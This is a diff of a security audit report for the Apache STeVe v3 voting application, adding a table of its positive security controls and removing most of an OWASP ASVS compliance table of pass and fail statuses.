+| Key length constraints in schema | Database CHECK constraints enforce 16-byte salt, 32-byte opened_key, 32-byte vote_token | v3/steve/schema.sql | Vote Encryption & Cryptography |
+| Key confidentiality protection | The opened_key is never exposed via public API (get_metadata() explicitly excludes it) | v3/steve/election.py | Vote Encryption & Cryptography |
+| Centralized cryptographic operations | All cryptographic operations centralized in crypto module for auditability | v3/steve/crypto.py | Vote Encryption & Cryptography |
+| No custom/homebrew cryptographic primitives | All cryptographic operations use well-known, peer-reviewed libraries (cryptography, argon2-cffi, hashlib, secrets) | v3/steve/crypto.py | Vote Encryption & Cryptography |
+| Library versions pinned with upper bounds | Versions constrained (e.g., cryptography>=46.0.5,&lt;47, argon2-cffi&gt;=25.1.0,<26) | pyproject.toml | Vote Encryption & Cryptography |
+| Fernet encrypt-then-MAC design prevents Padding Oracle attacks | The cryptography.fernet.Fernet class verifies HMAC-SHA256 before attempting AES-CBC decryption | v3/steve/crypto.py | Vote Encryption & Cryptography |
+| No insecure block modes | Fernet uses AES-128-CBC with PKCS7 + HMAC-SHA256, not ECB or weak padding | v3/steve/crypto.py:create_vote() | Vote Encryption & Cryptography |
+| Random IV generation per encrypt | Fernet library guarantees a fresh 128-bit random IV for every encryption call | cryptography.fernet.Fernet.encrypt() (internal) | Vote Encryption & Cryptography |
+| Unique salt per mayvote row | Each person-issue pair gets unique salt from secrets.token_bytes() | v3/steve/election.py:116 | Vote Encryption & Cryptography |
+| Immediate vote encryption | Votes encrypted immediately upon submission in add_vote() function | v3/steve/election.py:231 | Vote Encryption & Cryptography |
+| Vote shuffling before return | crypto.shuffle(votes) ensures decrypted vote order doesn't correlate to database insertion order | v3/steve/election.py | Vote Encryption & Cryptography |
+| Python secrets module with os.urandom() backing | Uses OS-level CSPRNG (/dev/urandom on Linux) which never blocks | v3/steve/crypto.py | Vote Encryption & Cryptography |
+| Server-side only token handling | The application reads session server-side and only passes display-safe attributes to templates | pages.py:68 | Authentication & Session Management |
+| No token in template variables | All .ezt templates do not contain access_token or refresh_token variables | All .ezt templates | Authentication & Session Management |
+| Metadata filtering | get_metadata() explicitly excludes salt and opened_key from returned data | election.py:144 | Authentication & Session Management |
+| Query-level protection | SQL queries for external-facing data explicitly select only safe columns, excluding cryptographic secrets | queries.yaml:q_open_to_me, q_owned, q_upcoming_to_me | Authentication & Session Management |
+| Template-level CSRF field inclusion | All forms include CSRF token hidden input field ready for proper implementation | manage.ezt, admin.ezt, vote-on.ezt | Authentication & Session Management |
+| Fetch header CSRF inclusion | JavaScript includes X-CSRFToken header in fetch requests, ready for validation | manage.ezt | Authentication & Session Management |
+| POST method for most mutations | Most state-changing endpoints correctly use POST (voting, creating elections, adding/editing/deleting issues, setting dates) | v3/server/pages.py | Authentication & Session Management |
+| Single authorization server architecture | The application uses only ASF's authentication infrastructure (R.committer, R.pmc_member) | pages.py | Authentication & Session Management |
+| Differentiated authorization levels | The application uses at minimum two different authorization levels (R.committer for general access, R.pmc_member for election creation) | pages.py | Authentication & Session Management |
+| Per-endpoint authorization | Each endpoint explicitly declares its required authorization level via decorators | pages.py | Authentication & Session Management |
+| Defense-in-depth authorization | Beyond authentication, the application performs additional authorization checks verifying voter eligibility and document access | v3/server/pages.py:236, 567 | Authentication & Session Management |
+| @asfquart.auth.require decorator | Applied to all protected endpoints to verify committer role and elevated roles | v3/server/pages.py:multiple endpoints | Authentication & Session Management |
+| Voter eligibility verification | vote_on_page endpoint verifies user has mayvote entries before displaying voting interface | v3/server/pages.py:267 | Authentication & Session Management |
+| Document access authorization | serve_doc endpoint implements fine-grained per-document authorization checking mayvote records | v3/server/pages.py:630 | Authentication & Session Management |
+| Role differentiation | Distinct role requirements between committer and pmc_member for election creation | v3/server/pages.py:multiple endpoints | Authentication & Session Management |
+| Consistent use of uid as unique user identifier | The application consistently uses uid (Apache ID) as the unique user identifier across all operations | v3/server/pages.py:85 | Authentication & Session Management |
+| LDAP uid as stable, non-reassignable identifier | The LDAP uid attribute is organizationally controlled by ASF and not reassignable | asf-load-ldap.py:53 | Authentication & Session Management |
+| PersonDB mapping maintains identity consistency | The PersonDB maps the LDAP uid to local records, maintaining identity consistency | asf-load-ldap.py:56 | Authentication & Session Management |
+| Server-side TLS enabled | Application uses TLS for server communication with ldaps:// for LDAP and https:// for OAuth URLs | v3/server/main.py:76-79 | Authentication & Session Management |
+| OAuth URLs use HTTPS | OAuth initialization and callback URLs configured with HTTPS protocol | v3/server/main.py:39-42 | Authentication & Session Management |
+| State parameter included in OAuth initiation URL | state parameter present in OAUTH_URL_INIT configuration, protecting against CSRF on the callback | v3/server/main.py:39-42 | Authentication & Session Management |
+| Server-side backchannel token exchange | Token exchange uses server-side backchannel (not implicit flow) | v3/server/main.py:39-42 | Authentication & Session Management |
+| Authorization code flow usage | The application uses authorization code flow (not implicit), which inherently uses query response mode as default | main.py:38-42 | Authentication & Session Management |
+| Hardcoded OAuth URLs providing implicit issuer pinning | Hardcoding of oauth.apache.org URLs provides implicit issuer pinning, reducing attack surface | v3/server/main.py:39-42 | Authentication & Session Management |
+| Client uses Authorization Code grant flow only | The client uses the Authorization Code grant flow exclusively via oauth.apache.org | main.py:38-42 | Authentication & Session Management |
+| No implicit flow usage | No evidence of response_type=token anywhere in codebase | - | Authentication & Session Management |
+| No Resource Owner Password Credentials flow usage | No ROPC flow configured or used in the codebase | - | Authentication & Session Management |
+| Static OAuth configuration with hardcoded endpoints | The application uses a static OAuth configuration with hardcoded endpoints to oauth.apache.org | main.py:39-42 | Authentication & Session Management |
+| Organizationally unique UIDs from ASF LDAP | The uid values come from ASF LDAP, ensuring they are organizationally unique | asf-load-ldap.py | Authentication & Session Management |
+| Non-reassignable committer IDs | LDAP UIDs are inherently non-reassignable within the ASF organization (committer IDs are permanent) | - | Authentication & Session Management |
+| OAuth-based authentication (no local passwords) | Authentication is entirely delegated to ASF's OAuth infrastructure. No local password management implemented. | main.py:39-42 | Authentication & Session Management |
+| No local password storage | CORRECTLY ABSENT - application does not implement local password authentication | - | Authentication & Session Management |
+| Parameterized queries | SQL queries use parameterized queries throughout, preventing SQL injection | v3/steve/election.py | Injection Prevention |
+| OS Command Injection Prevention | No evidence of os.system(), subprocess without shell=False, or eval() of OS commands | - | Injection Prevention |
+| XPath Injection Prevention | No XPath query construction from user input observed | - | Injection Prevention |
+| LaTeX Injection Prevention | No LaTeX template generation observed | - | Injection Prevention |
+| Regex Special Character Escaping | No user input directly interpolated into regex patterns | - | Injection Prevention |
+| CSV and Formula Injection Prevention | No CSV generation endpoints observed | - | Injection Prevention |
+| Dynamic Code Execution | No eval(), exec(), or compile() with user input observed | - | Injection Prevention |
+| Format String Protection | Python f-strings are not vulnerable to format string attacks in the same way as C printf | - | Injection Prevention |
+| ReDoS Protection | No complex user-controlled regex patterns observed | - | Injection Prevention |
+| SSRF Protection | No user-controlled URL fetching observed | - | Injection Prevention |
+| Template Injection Protection | EZT templates use [variable] syntax which is not executable | - | Injection Prevention |
+| Memory-Safe String and Pointer Operations | Python's memory management prevents buffer overflows and pointer arithmetic vulnerabilities | - | Memory Safety |
+| Integer Overflow Prevention | Python 3 has arbitrary precision integers preventing overflow | - | Memory Safety |
+| Memory and Resource Release | Python's garbage collection automatically manages memory | - | Memory Safety |
+| XML Parser Restrictive Configuration | No XML parsing observed in application code | - | Injection Prevention |
+| Parser Consistency | Single database driver (sqlite3) used throughout | - | Injection Prevention |
+| Supported Client-Side Technologies | Application uses modern, supported web technologies (HTML5, JavaScript ES6+) | - | Web Frontend Security |
+| postMessage Validation | No postMessage usage observed | - | Web Frontend Security |
+| JSONP Not Enabled | No JSONP endpoints observed | - | Web Frontend Security |
+| Authorization Data Not in Script Resources | No authorization tokens embedded in JavaScript resources | - | Web Frontend Security |
+| HTTP to HTTPS Redirect Behavior | Application supports HTTPS configuration | v3/server/main.py | HTTP Security |
+| HTTP/2 and HTTP/3 Connection-Specific Header Fields | Framework (Quart) handles HTTP/2 connection management | - | HTTP Security |
+| Default Credentials for Service Authentication | No default credentials shipped with application | - | Backend Communications |
+| Web Servers Do Not Expose Directory Listings | Static file serving uses explicit file paths, not directory listings | - | Configuration & Deployment |
+| Zip Slip Protection | No zip file extraction observed | - | File Handling |
+
+---
 
 # 5. ASVS Compliance Summary
 
 | ASVS ID | Title | Status |
 |---------|-------|--------|
-| **1.1.1** | Encoding and Sanitization Architecture - Canonical Decoding | Partial |
-| **1.1.2** | Encoding and Sanitization Architecture - Output Encoding as Final Step | Fail |
-| **1.2.1** | Injection Prevention - Context-Appropriate Output Encoding | Fail |
-| **1.2.2** | Injection Prevention - URL Encoding and Safe Protocols | Fail |
-| **1.2.3** | Injection Prevention - JavaScript/JSON Encoding | Fail |
-| **1.2.4** | Injection Prevention | Pass |
-| **1.2.5** | OS Command Injection Prevention | Pass |
-| **1.2.6** | LDAP Injection Prevention | Pass |
-| **1.2.7** | XPath Injection Prevention | Pass |
-| **1.2.8** | LaTeX Injection Prevention | Pass |
-| **1.2.9** | Regular Expression Injection Prevention | Pass |
-| **1.2.10** | Injection Prevention - CSV and Formula Injection | Pass |
-| **1.3.1** | HTML Sanitization of Untrusted Input | Fail |
-| **1.3.2** | Dynamic Code Execution | Pass |
-| **1.3.3** | Sanitization Before Dangerous Contexts | Fail |
-| **1.3.4** | SVG Sanitization | Pass |
-| **1.3.5** | Scriptable/Expression Template Language Content | Fail |
-| **1.3.6** | SSRF Protection | Pass |
-| **1.3.7** | Template Injection Protection | Pass |
-| **1.3.8** | JNDI Injection Prevention | Partial |
-| **1.3.9** | Memcache Injection Prevention | N/A |
-| **1.3.10** | Format String Sanitization | Partial |
-| **1.3.11** | SMTP/IMAP Injection Prevention | Partial |
-| **1.3.12** | ReDoS Prevention | Pass |
-| **1.4.1** | Memory-Safe String and Pointer Operations | Pass |
-| **1.4.2** | Integer Overflow Prevention | Pass |
-| **1.4.3** | Memory and Resource Release | Pass |
-| **1.5.1** | XML Parser Restrictive Configuration | Pass |
-| **1.5.2** | Safe Deserialization | Partial |
-| **1.5.3** | Parser Consistency | Pass |
-| **2.1.1** | Validation and Business Logic Documentation - Input Validation Rules | Partial |
-| **2.1.2** | Validation and Business Logic Documentation - Contextual Consistency | Fail |
-| **2.1.3** | Validation and Business Logic Documentation - Business Logic Limits | Fail |
-| **2.2.1** | Input Validation | Fail |
-| **2.2.2** | Input Validation at Trusted Service Layer | Fail |
-| **2.2.3** | Combinations of Related Data Items | Fail |
-| **2.3.1** | Business Logic Sequential Step Order | Fail |
-| **2.3.2** | Business Logic Limits | Fail |
-| **2.3.3** | Transaction Usage at Business Logic Level | Fail |
-| **2.3.4** | Business Logic Locking (Double-Booking Prevention) | Fail |
-| **2.3.5** | Multi-User Approval for High-Value Operations | Fail |
-| **2.4.1** | Anti-Automation Controls | Fail |
-| **2.4.2** | Anti-Automation: Realistic Human Timing Controls | Fail |
-| **3.1.1** | Web Frontend Security Documentation | Fail |
-| **3.2.1** | Unintended Content Interpretation | Fail |
-| **3.2.2** | Safe Rendering (Text vs HTML) | Fail |
-| **3.2.3** | DOM Clobbering Prevention | Fail |
-| **3.3.1** | Cookie Secure Attribute and Prefix | Fail |
-| **3.3.2** | Cookie SameSite Attribute | Fail |
-| **3.3.3** | Cookie __Host- Prefix | Fail |
-| **3.3.4** | Cookie HttpOnly Attribute | Fail |
-| **3.3.5** | Cookie Size Limit (4096 bytes) | Partial |
-| **3.4.1** | Strict-Transport-Security (HSTS) Header | Fail |
-| **3.4.2** | CORS Access-Control-Allow-Origin | Fail |
-| **3.4.3** | Content-Security-Policy Header | Fail |
-| **3.4.4** | X-Content-Type-Options Header | Fail |
-| **3.4.5** | Referrer-Policy Header | Fail |
-| **3.4.6** | frame-ancestors Directive | Fail |
-| **3.4.7** | CSP Report-URI/Report-To | Fail |
-| **3.4.8** | Cross-Origin-Opener-Policy Header | Fail |
-| **3.5.1** | Browser Origin Separation - Anti-Forgery Tokens | Fail |
-| **3.5.2** | Browser Origin Separation - CORS Preflight Mechanism | Fail |
-| **3.5.3** | Browser Origin Separation - HTTP Methods | Fail |
-| **3.5.4** | Browser Origin Separation - Separate Hostnames | Fail |
-| **3.5.5** | Browser Origin Separation - postMessage Validation | N/A |
-| **3.5.6** | Browser Origin Separation - JSONP | Pass |
-| **3.5.7** | Browser Origin Separation - XSSI Prevention | Partial |
-| **3.5.8** | Browser Origin Separation - Authenticated Resource Loading | Fail |
-| **3.6.1** | External Resource Integrity | Partial |
-| **3.7.1** | Supported and Secure Client-Side Technologies | Pass |
-| **3.7.2** | Redirect Allowlist for External Domains | Partial |
-| **3.7.3** | Redirect Notification for External URLs | Fail |
-| **3.7.4** | HSTS Preload List | Fail |
-| **3.7.5** | Browser Security Feature Detection | Fail |
-| **4.1.1** | Content-Type Header Verification | N/A |
-| **4.1.2** | HTTP to HTTPS Redirect Behavior | Pass |
-| **4.1.3** | Intermediary Header Override Protection | Partial |
-| **4.1.4** | HTTP Method Restriction | Partial |
-| **4.1.5** | Per-Message Digital Signatures | Fail |
-| **4.2.1** | HTTP Request Smuggling Prevention | Partial |
-| **4.2.2** | Content-Length Header Validation | N/A |
-| **4.2.3** | HTTP/2 and HTTP/3 Connection-Specific Header Fields | Pass |
-| **4.2.4** | CR/LF/CRLF Injection in HTTP/2 and HTTP/3 Headers | N/A |
-| **4.2.5** | URI and Header Field Length Validation | N/A |
-| **4.3.1** | GraphQL DoS Prevention | N/A |
-| **4.3.2** | GraphQL Introspection Disabled in Production | N/A |
-| **4.4.1** | WebSocket over TLS (WSS) | N/A |
-| **4.4.2** | Origin Header Validation on WebSocket Handshake | N/A |
-| **4.4.3** | Dedicated WebSocket Session Tokens | N/A |
-| **4.4.4** | WebSocket Token Validation via Authenticated HTTPS | N/A |
-| **5.1.1** | File Handling Documentation | Fail |
-| **5.2.1** | File Size Limits | Fail |
-| **5.2.2** | File Extension and Content Validation | Fail |
-| **5.2.3** | Compressed File Checks | Fail |
-| **5.2.4** | File Size Quota and Maximum File Count Per User | Fail |
-| **5.2.5** | Symlink Prevention in Compressed Files | Fail |
-| **5.2.6** | Pixel Flood Attack Prevention | N/A |
-| **5.3.1** | Uploaded Files Not Executed as Server-Side Code | Partial |
-| **5.3.2** | Path Traversal Protection | Partial |
-| **5.3.3** | Zip Slip Protection | Pass |
-| **5.4.1** | Filename Validation in Downloads | Fail |
-| **5.4.2** | Filename Encoding/Sanitization in Responses | Fail |
-| **5.4.3** | Antivirus Scanning of Untrusted Files | Fail |
-| **6.1.1** | Authentication Documentation - Rate Limiting and Anti-Automation | Fail |
-| **6.1.2** | Authentication Documentation - Context-Specific Password Deny List | Fail |
-| **6.1.3** | Authentication Documentation - Multiple Authentication Pathways | Fail |
-| **6.2.1** | Password Security - Minimum Length | Pass |
-| **6.2.2** | Password Security - Password Change Capability | N/A |
-| **6.2.3** | Password Security - Password Change Requires Current Password | N/A |
-| **6.2.4** | Password Blocklist Check | N/A |
-| **6.2.5** | No Password Composition Rules | Pass |
-| **6.2.6** | Password Field Masking (type=password) | N/A |
-| **6.2.7** | Paste and Password Manager Support | Pass |
-| **6.2.8** | No Password Modification Before Verification | Pass |
-| **6.2.9** | Support Passwords of 64+ Characters | N/A |
-| **6.2.10** | Password Validity Until Compromise | Pass |
-| **6.2.11** | Context-Specific Word Blocklist | N/A |
-| **6.2.12** | Breached Password Check | N/A |
-| **6.3.1** | Credential Stuffing and Brute Force Prevention | Partial |
-| **6.3.2** | Default User Accounts | Pass |
-| **6.3.3** | Multi-Factor Authentication | Fail |
-| **6.3.4** | Authentication Pathway Consistency | Fail |
-| **6.3.5** | Suspicious Authentication Notification | Fail |
-| **6.3.6** | Email Not Used for Authentication | Pass |
-| **6.3.7** | User Notification on Authentication Detail Changes | Fail |
-| **6.3.8** | User Enumeration Protection | Pass |
-| **6.4.1** | System Generated Initial Passwords/Activation Codes | N/A |
-| **6.4.2** | No Password Hints or Knowledge-Based Authentication | Pass |
-| **6.4.3** | Secure Password Reset Process | N/A |
-| **6.4.4** | MFA Factor Loss Requires Identity Proofing | N/A |
-| **6.4.5** | Renewal Instructions for Expiring Authentication Mechanisms | N/A |
-| **6.4.6** | Administrative Password Reset Without Knowing User Password | N/A |
-| **6.5.1** | One-Time Use of Lookup Secrets, OOB Codes, and TOTPs | N/A |
-| **6.5.2** | Lookup Secret Storage with Proper Hashing | N/A |
-| **6.5.3** | CSPRNG for Lookup Secrets, OOB Codes, and TOTP Seeds | Pass |
-| **6.5.4** | Minimum 20 Bits of Entropy for Lookup Secrets and OOB Codes | N/A |
-| **6.5.5** | Defined Lifetime for OOB Requests/Codes and TOTPs | Pass |
-| **6.5.6** | Revocability of Authentication Factors | Partial |
-| **6.5.7** | Biometric Authentication as Secondary Factor Only | Pass |
-| **6.5.8** | TOTP Time Source from Trusted Service | Pass |
-| **6.6.1** | PSTN/SMS OTP Restrictions | Pass |
-| **6.6.2** | Out-of-Band Authentication Binding | Partial |
-| **6.6.3** | Brute Force Protection for Code-based OOB | N/A |
-| **6.6.4** | Push Notification Rate Limiting | N/A |
-| **6.7.1** | Certificate Storage Protection for Cryptographic Authentication | N/A |
-| **6.7.2** | Challenge Nonce Requirements | N/A |
-| **6.8.1** | IdP Identity Spoofing Prevention | Pass |
-| **6.8.2** | Digital Signature Validation on Authentication Assertions | Partial |
-| **6.8.3** | SAML Assertion Replay Prevention | N/A |
-| **6.8.4** | Authentication Strength Verification from IdP | Fail |
-| **7.1.1** | Session Inactivity Timeout and Maximum Session Lifetime Documentation | Fail |
-| **7.1.2** | Concurrent Session Documentation | Fail |
-| **7.1.3** | Federated Identity Management Documentation | Fail |
-| **7.2.1** | Backend Session Token Verification | Pass |
-| **7.2.2** | Dynamic Session Tokens (Not Static API Keys) | Pass |
-| **7.2.3** | Reference Tokens - CSPRNG with 128+ Bits Entropy | Partial |
-| **7.2.4** | Fundamental Session Management Security | Fail |
-| **7.3.1** | Session Timeout | Fail |
-| **7.3.2** | Session Timeout | Fail |
-| **7.4.1** | Session Termination | Fail |
-| **7.4.2** | Session Termination | Fail |
-| **7.4.3** | Session Termination | Fail |
-| **7.4.4** | Session Termination - Logout Visibility | Partial |
-| **7.4.5** | Admin Session Termination | Fail |
-| **7.5.1** | Re-authentication Before Sensitive Account Changes | Fail |
-| **7.5.2** | User Session Viewing and Termination | Fail |
-| **7.5.3** | Step-up Authentication for Sensitive Operations | Fail |
-| **7.6.1** | Federated Re-authentication | Fail |
-| **7.6.2** | Federated Re-authentication | Fail |
-| **8.1.1** | Authorization Documentation - Function-level and Data-specific Access | Partial |
-| **8.1.2** | Authorization Documentation - Field-level Access Restrictions | Fail |
-| **8.1.3** | Authorization Documentation - Environmental and Contextual Attributes | Fail |
-| **8.1.4** | Authorization Documentation - Environmental Factors in Decision-Making | Fail |
-| **8.2.1** | General Authorization Design - Function-level Access | Fail |
-| **8.2.2** | General Authorization Design - Data-specific Access (IDOR/BOLA) | Fail |
-| **8.2.3** | General Authorization Design - Field-level Access (BOPLA) | Fail |
-| **8.2.4** | General Authorization Design - Adaptive Security Controls | Fail |
-| **8.3.1** | Operation Level Authorization - Server-Side Enforcement | Fail |
-| **8.3.2** | Operation Level Authorization - Immediate Authorization Change Application | Fail |
-| **8.3.3** | Operation Level Authorization - Subject-Based Permissions | Pass |
-| **8.4.1** | Other Authorization Considerations - Multi-Tenant Cross-Tenant Controls | Fail |
-| **8.4.2** | Other Authorization Considerations - Administrative Interface Multi-Layer Security | Fail |
-| **9.1.1** | Token Signature Validation | Partial |
-| **9.1.2** | Algorithm Allowlist for Token Verification | Fail |
-| **9.1.3** | Key Material from Trusted Pre-configured Sources | Fail |
-| **9.2.1** | Token Validity Time Span Verification | Partial |
-| **9.2.2** | Token Type Verification | Fail |
-| **9.2.3** | Token Audience Validation | Fail |
-| **9.2.4** | Token Audience Restriction | Fail |
-| **10.1.1** | Token Exposure Limitation | Partial |
-| **10.1.2** | Client-Generated Secrets for OAuth Flow Security | Partial |
-| **10.2.1** | OAuth Client CSRF Protection for Code Flow | Partial |
-| **10.2.2** | Mix-Up Attack Defense | Pass |
-| **10.2.3** | Minimal Scope Requests | Fail |
-| **10.3.1** | Resource Server Audience Validation | Partial |
-| **10.3.2** | Authorization Decisions Based on Token Claims | Fail |
-| **10.3.3** | User Identification from Access Token Claims | Partial |
-| **10.3.4** | Authentication Strength Verification | Fail |
-| **10.3.5** | Sender-Constrained Access Tokens | Fail |
-| **10.4.1** | Redirect URI Validation | Partial |
-| **10.4.2** | Authorization Code One-Time Use | Partial |
-| **10.4.3** | Authorization Code Short Lifetime | Partial |
-| **10.4.4** | OAuth Grant Type Restriction | Partial |
-| **10.4.5** | Refresh Token Replay Mitigation | N/A |
-| **10.4.6** | PKCE Enforcement for Code Grant | Fail |
-| **10.4.7** | Dynamic Client Registration Security | N/A |
-| **10.4.8** | Refresh Token Absolute Expiration | N/A |
-| **10.4.9** | Token Revocation by Authorized User | Partial |
-| **10.4.10** | Confidential Client Authentication for Backchannel Requests | Partial |
-| **10.4.11** | Authorization Server Only Assigns Required Scopes | Partial |
-| **10.4.12** | Only Allow Needed response_mode per Client | Partial |
-| **10.4.13** | Grant Type 'code' Always Used with PAR | Fail |
-| **10.4.14** | Sender-Constrained (Proof-of-Possession) Access Tokens | Fail |
-| **10.4.15** | Authorization Details Parameter Integrity for Server-Side Clients | Partial |
-| **10.4.16** | Strong Client Authentication Methods | Fail |
-| **10.5.1** | ID Token Replay Attack Mitigation (Nonce Validation) | Fail |
-| **10.5.2** | User Identification from ID Token Claims (sub claim) | Partial |
-| **10.5.3** | Authorization Server Metadata Issuer Validation | Pass |
-| **10.5.4** | ID Token Audience (aud) Claim Validation | Fail |
-| **10.5.5** | OIDC Back-Channel Logout Security | N/A |
-| **10.6.1** | OpenID Provider Response Mode Restrictions | N/A |
-| **10.6.2** | OpenID Provider Forced Logout DoS Mitigation | N/A |
-| **10.7.1** | User Consent for Authorization Requests | N/A |
-| **10.7.2** | Clear Consent Information Presentation | N/A |
-| **10.7.3** | User Review/Modify/Revoke Consents | N/A |
-| **11.1.1** | Cryptographic Key Management Policy | Fail |
-| **11.1.2** | Cryptographic Inventory | Fail |
-| **11.1.3** | Cryptographic Discovery Mechanisms | Fail |
-| **11.1.4** | Cryptographic Inventory with PQC Migration Plan | Fail |
-| **11.2.1** | Industry-Validated Cryptographic Implementations | Partial |
-| **11.2.2** | Crypto Agility | Fail |
-| **11.2.3** | Minimum 128-bits of Security | Partial |
-| **11.2.4** | Constant-Time Operations | Fail |
-| **11.2.5** | Secure Cryptographic Failure | Partial |
-| **11.3.1** | No Insecure Block Modes or Weak Padding | Pass |
-| **11.3.2** | Approved Ciphers and Modes | Partial |
-| **11.3.3** | Protection Against Unauthorized Modification | Pass |
-| **11.3.4** | Nonces, IVs, and Single-Use Numbers | Pass |
-| **11.3.5** | Encrypt-then-MAC Mode | Pass |
-| **11.4.1** | Approved Hash Functions | Partial |
-| **11.4.2** | Password Storage with Approved KDF | Partial |
-| **11.4.3** | Hash Functions for Digital Signatures / Data Integrity | Pass |
-| **11.4.4** | Approved KDF with Key Stretching for Key Derivation from Passwords | Partial |
-| **11.5.1** | Random Values - CSPRNG with 128-bit Entropy | Fail |
-| **11.5.2** | Random Number Generation Under Heavy Demand | Pass |
-| **11.6.1** | Approved Cryptographic Algorithms and Modes | Partial |
-| **11.6.2** | Approved Key Exchange Algorithms with Secure Parameters | N/A |
-| **11.7.1** | Full Memory Encryption for Sensitive Data In-Use | Fail |
-| **11.7.2** | Data Minimization and Immediate Encryption | Partial |
-| **12.1.1** | General TLS Security Guidance - TLS Protocol Versions | Fail |
-| **12.1.2** | General TLS Security Guidance - Cipher Suites | Fail |
-| **12.1.3** | General TLS Security Guidance - mTLS Client Certificate Validation | N/A |
-| **12.1.4** | General TLS Security Guidance - Certificate Revocation (OCSP Stapling) | Fail |
-| **12.1.5** | General TLS Security Guidance - Encrypted Client Hello (ECH) | Fail |
-| **12.2.1** | HTTPS Communication with External Facing Services | Fail |
-| **12.2.2** | HTTPS Communication with External Facing Services | Fail |
-| **12.3.1** | General Service to Service Communication Security | Fail |
-| **12.3.2** | TLS Certificate Validation by Clients | Partial |
-| **12.3.3** | TLS for Internal HTTP-based Services | Fail |
-| **12.3.4** | Trusted Certificates for Internal Service TLS | Fail |
-| **12.3.5** | Strong Authentication for Intra-Service Communications | Fail |
-| **13.1.1** | Communication Needs Documentation | Fail |
-| **13.1.2** | Connection Pool Limits and Fallback | Fail |
-| **13.1.3** | Resource Management Strategies | Fail |
-| **13.1.4** | Secrets Documentation and Rotation | Partial |
-| **13.2.1** | Backend Communication Authentication | Partial |
-| **13.2.2** | Least Privilege for Backend Communications | Fail |
-| **13.2.3** | No Default Credentials for Service Authentication | Pass |
-| **13.2.4** | Allowlist for External Resource Communication | Fail |
-| **13.2.5** | Server Allowlist for Outbound Requests/Data Loads | Fail |
-| **13.2.6** | Documented Connection Configuration | Fail |
-| **13.3.1** | Secret Management Solution | Fail |
-| **13.3.2** | Least Privilege Access to Secrets | Fail |
-| **13.3.3** | Isolated Security Module for Cryptographic Operations | Fail |
-| **13.3.4** | Secret Expiration and Rotation | Fail |
-| **13.4.1** | Source Control Metadata | Partial |
-| **13.4.2** | Debug Modes Disabled in Production | Fail |
-| **13.4.3** | Directory Listings Disabled | Pass |
-| **13.4.4** | HTTP TRACE Method Disabled | Fail |
-| **13.4.5** | Documentation and Monitoring Endpoints | Partial |
-| **13.4.6** | Backend Version Information | Fail |
-| **13.4.7** | Unintended Information Leakage - Web Tier File Extension Filtering | Partial |
-| **14.1.1** | Data Classification | Partial |
-| **14.1.2** | Documented Protection Requirements | Fail |
-| **14.2.1** | Sensitive Data Not in URL/Query String | Pass |
-| **14.2.2** | Prevent Sensitive Data Caching | Partial |
-| **14.2.3** | Sensitive Data Not Sent to Untrusted Parties | Pass |
-| **14.2.4** | General Data Protection - Encryption, Integrity, Retention, Logging Controls | Partial |
-| **14.2.5** | Caching Mechanisms and Web Cache Deception Prevention | N/A |
-| **14.2.6** | Minimum Required Sensitive Data / Data Masking | Partial |
-| **14.2.7** | Data Retention Classification and Automatic Deletion | Fail |
-| **14.2.8** | Metadata Removal from User-Submitted Files | N/A |
-| **14.3.1** | Clear-Site-Data on Session Termination | Fail |
-| **14.3.2** | Anti-caching HTTP Response Headers | Fail |
-| **14.3.3** | No Sensitive Data in Browser Storage | Partial |
-| **15.1.1** | Risk-Based Remediation Timeframes | Fail |
-| **15.1.2** | SBOM and Inventory Catalog | Fail |
-| **15.1.3** | Documentation of Resource-Demanding Functionality | Fail |
-| **15.1.4** | Documentation of Risky Components | Fail |
-| **15.1.5** | Documentation of Dangerous Functionality | Fail |
-| **15.2.1** | Components Within Remediation Timeframes | Fail |
-| **15.2.2** | Defenses Against Loss of Availability Due to Resource-Demanding Functionality | Fail |
-| **15.2.3** | Production Environment Only Includes Required Functionality | Partial |
-| **15.2.4** | Third-Party Components From Expected Repositories Without Dependency Confusion Risk | Fail |
-| **15.2.5** | Additional Protections Around Dangerous Functionality and Risky Components | Fail |
-| **15.3.1** | Data Object Field Subsetting | Partial |
-| **15.3.2** | Backend URL Following Redirects | Pass |
-| **15.3.3** | Mass Assignment Protection | Partial |
-| **15.3.4** | IP Address Handling by Proxies and Middleware | Fail |
-| **15.3.5** | Type Safety and Strict Comparisons | Partial |
-| **15.3.6** | Prototype Pollution Prevention | Partial |
-| **15.3.7** | HTTP Parameter Pollution Defenses | Partial |
-| **15.4.1** | Safe Concurrency — Thread-Safe Shared Objects | Fail |
-| **15.4.2** | Safe Concurrency — TOCTOU Race Conditions | Fail |
-| **15.4.3** | Safe Concurrency — Consistent Lock Usage | Fail |
-| **15.4.4** | Safe Concurrency — Resource Allocation and Thread Starvation | Fail |
-| **16.1.1** | Security Logging Documentation | Fail |
-| **16.2.1** | General Logging - Metadata Requirements | Fail |
-| **16.2.2** | Time Synchronization and UTC Timestamps | Fail |
-| **16.2.3** | Logs Only to Documented Destinations | Fail |
-| **16.2.4** | Logs Readable and Correlatable by Log Processor | Partial |
-| **16.2.5** | Sensitive Data Protection in Logs | Fail |
-| **16.3.1** | Authentication Operations Logging | Fail |
-| **16.3.2** | Authorization Failure Logging | Fail |
-| **16.3.3** | Security Events and Bypass Attempts Logging | Fail |
-| **16.3.4** | Unexpected Errors and Security Control Failures Logging | Fail |
-| **16.4.1** | Log Injection Prevention | Fail |
-| **16.4.2** | Log Protection from Unauthorized Access and Modification | Fail |
-| **16.4.3** | Log Protection - Secure Transmission | Fail |
-| **16.5.1** | Error Handling - Generic Messages | Partial |
-| **16.5.2** | Error Handling - External Resource Failure | Fail |
-| **16.5.3** | Error Handling - Fail Gracefully and Securely | Fail |
-| **16.5.4** | Error Handling - Last Resort Error Handler | Fail |
-| **17.1.1** | TURN Server IP Address Filtering | N/A |
-| **17.1.2** | TURN Server Resource Exhaustion | N/A |
-| **17.2.1** | DTLS Certificate Key Management | N/A |
-| **17.2.2** | DTLS Cipher Suites and SRTP Protection Profile | N/A |
-| **17.2.3** | SRTP Authentication Verification | N/A |
-| **17.2.4** | Resilience to Malformed SRTP Packets | N/A |
-| **17.2.5** | Resilience to SRTP Packet Floods | N/A |
-| **17.2.6** | DTLS ClientHello Race Condition | N/A |
-| **17.2.7** | Recording Mechanism Resilience During Floods | N/A |
-| **17.2.8** | DTLS Certificate Verification Against SDP Fingerprint | N/A |
-| **17.3.1** | Signaling Server Rate Limiting Against Flood Attacks | N/A |
-| **17.3.2** | Signaling Server Resilience Against Malformed Messages | N/A | ---
+| **11. Cryptography** |
+| 11.1.1 | Cryptographic Key Management Policy | ❌ Fail |
+| 11.1.2 | Cryptographic Inventory | ❌ Fail |
